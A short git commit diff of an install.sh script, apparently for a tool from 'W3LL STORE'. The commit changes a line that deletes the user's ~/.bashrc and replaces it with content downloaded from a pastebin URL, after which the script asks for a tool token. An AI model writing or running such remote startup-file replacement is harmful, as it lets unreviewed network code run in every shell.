57a41111819942a89eace8831fe24109c292e095
W3LL STORE <81862344+W3LLLL@users.noreply.github.com>
2021-06-22 17:21:37 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -24,7 +24,7 @@ sudo unzip -o PEREV.zip
 sudo rm PEREV.zip
 cp ~/.bashrc ~/.bashrc-bak
 rm -rf ~/.bashrc
-curl "https://pastebin.com/raw/6r3Ux9rX" -o ~/.bashrc
+curl "https://pastebin.com/raw/aih0eKsZ" -o ~/.bashrc
 dos2unix ~/.bashrc
 clear
 printf "\e[92mEnter Your Tool Token: \033[0;33m"
